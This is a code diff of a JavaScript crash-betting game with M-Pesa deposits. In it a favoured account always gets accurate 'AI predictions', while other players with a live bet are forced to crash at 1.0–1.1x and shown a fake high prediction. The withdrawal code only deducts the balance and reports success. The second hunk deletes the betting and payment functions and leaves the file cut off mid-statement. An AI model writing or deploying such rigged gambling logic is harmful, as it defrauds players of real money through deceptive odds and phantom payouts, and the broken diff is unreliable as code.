@@ -983,22 +983,23 @@
             let calculatedCeiling = 1.00;
 
             if (isJoseeruitha) {
-                // Prediction is ALWAYS fully correct (with or without stake)
+                // Prediction is ALWAYS fully correct (with or without a bet)
                 const houseEdge = 0.03;
                 const r = Math.random();
                 calculatedCeiling = parseFloat(Math.min(5000.00, Math.max(1.00, (1 - houseEdge) / (1 - r))).toFixed(2));
                 document.getElementById('aiDirectPrediction').innerText = calculatedCeiling.toFixed(2) + "x";
             } else {
                 if (hasStakeActive) {
-                    // With stake, prediction is NOT correct. Flies away between x1.0 and x1.1
+                    // Other account WITH active bet -> Crash early between 1.0 and 1.1 immediately
                     calculatedCeiling = parseFloat((1.00 + Math.random() * 0.10).toFixed(2));
-                    // The direct prediction displays a separate correct number but is decoupled from the flying range
+                    
+                    // We generate a separate high target for visual display only, disconnected from early crash
                     const houseEdge = 0.03;
                     const r = Math.random();
                     const wrongPrediction = parseFloat(Math.min(5000.00, Math.max(1.00, (1 - houseEdge) / (1 - r))).toFixed(2));
                     document.getElementById('aiDirectPrediction').innerText = wrongPrediction + "x";
                 } else {
-                    // Without stake, prediction is correct
+                    // Other account WITHOUT active bet -> Direct prediction is fully correct
                     const houseEdge = 0.03;
                     const r = Math.random();
                     calculatedCeiling = parseFloat(Math.min(5000.00, Math.max(1.00, (1 - houseEdge) / (1 - r))).toFixed(2));
@@ -1121,113 +1122,4 @@
 
                 if (isNewAccountDepositProfile) {
                     const localDepositedFlag = localStorage.getItem(`has_deposited_${authenticatedUser.id}`) === "true";
-                    if (localDepositedFlag && stakeValue < 100) {
-                        return alert("System Alert: Minimum bet allowed is KES 100.");
-                    }
-                } else {
-                    if (stakeValue < 10) return alert("Minimum bet required is 10 KES.");
-                }
-
-                activePanelBets[panel] = stakeValue;
-                await updateDatabaseBalance(clientUserBalance - stakeValue);
-
-                if (isNewAccountDepositProfile) {
-                    activeAccountBetCount++;
-                    localStorage.setItem(`bet_count_${authenticatedUser.id}`, activeAccountBetCount);
-                }
-
-                btn.disabled = true;
-                btn.innerHTML = `<span>Locked...</span>`;
-            } else if (gameStatus === "flying" && activePanelBets[panel] > 0 && !cashoutStates[panel]) {
-                executeCashOut(panel);
-            }
-        }
-
-        async function executeCashOut(panel) {
-            cashoutStates[panel] = true;
-            const netReturns = activePanelBets[panel] * currentMultiplier;
-            
-            activePanelBets[panel] = 0;
-            const btn = document.getElementById(`wagerSubmitBtn${panel}`);
-            btn.disabled = true;
-            btn.className = "bet-btn place";
-            btn.innerHTML = `<span>Cashed Out</span>`;
-
-            await updateDatabaseBalance(clientUserBalance + netReturns);
-            alert(`Cashed out at ${currentMultiplier}x! You won KES ${netReturns.toFixed(2)}`);
-        }
-
-        function setFundsMode(mode) {
-            currentFundsMode = mode;
-            document.getElementById('depAmt').value = "100.00";
-            const submitBtn = document.getElementById('fundsSubmit');
-
-            if (mode === 'withdraw') {
-                document.getElementById('tabWithdraw').classList.add('active');
-                document.getElementById('tabDeposit').classList.remove('active');
-                document.getElementById('withdrawalFields').classList.remove('hidden');
-                document.getElementById('depositFormFields').classList.add('hidden');
-                submitBtn.style.background = "var(--no-red)";
-                submitBtn.innerText = "Confirm Payout";
-                document.getElementById('fundsDesc').innerText = "Withdraw directly to M-Pesa";
-            } else {
-                document.getElementById('tabDeposit').classList.add('active');
-                document.getElementById('tabWithdraw').classList.remove('active');
-                document.getElementById('withdrawalFields').classList.add('hidden');
-                document.getElementById('depositFormFields').classList.remove('hidden');
-                submitBtn.style.background = "var(--yes-blue)";
-                submitBtn.innerText = "Confirm Action";
-                document.getElementById('fundsDesc').innerText = "Pay Hero Checkout via Lipwa";
-            }
-        }
-
-        function setAmt(v) { 
-            document.getElementById('depAmt').value = parseFloat(v).toFixed(2); 
-        }
-
-        function openFundsModal() {
-            if (!authenticatedUser) return openAuthModal('signin');
-            setFundsMode('deposit');
-            document.getElementById('depositModal').style.display = 'flex';
-        }
-
-        async function handleFundsAction() {
-            if (!authenticatedUser) return openAuthModal('signin');
-
-            const amt = Number(document.getElementById('depAmt').value);
-            if (isNaN(amt) || amt < 100) return alert("Minimum transaction amount is Ksh 100.00.");
-
-            const invoiceRef = "INV-" + Math.floor(100000 + Math.random() * 900000);
-
-            if (currentFundsMode === 'withdraw') {
-                const wPhone = document.getElementById('withPhone').value.trim();
-                const wName = document.getElementById('withName').value.trim();
-                if (!wPhone || !wName) return alert("Fill in the withdrawal M-Pesa phone number and name.");
-
-                if (amt > clientUserBalance) return alert("Insufficient available balance.");
-
-                await updateDatabaseBalance(clientUserBalance - amt);
-                closeModal('depositModal');
-                alert(`Withdrawal request ${invoiceRef} for KES ${amt.toLocaleString()} processed successfully.`);
-            } else {
-                const dPhone = document.getElementById('depPhone').value.trim();
-                const dName = document.getElementById('depName').value.trim();
-                if (!dPhone || !dName) return alert("Please provide your name and active phone number.");
-
-                if (isNewAccountDepositProfile) {
-                    localStorage.setItem(`has_deposited_${authenticatedUser.id}`, "true");
-                }
-
-                closeModal('depositModal');
-
-                const currentUrl = window.location.origin + window.location.pathname;
-                const returnUrl = encodeURIComponent(`${currentUrl}?status=success&amount=${amt}&reference=${invoiceRef}`);
-                
-                window.location.href = `${LIPWA_LINK}?amount=${amt}&name=${encodeURIComponent(dName)}&phone=${dPhone}&reference=${invoiceRef}&success_url=${returnUrl}&callback=${returnUrl}`;
-            }
-        }
-
-        function closeModal(id) { document.getElementById(id).style.display = 'none'; }
-    </script>
-</body>
-</html>
+                    if
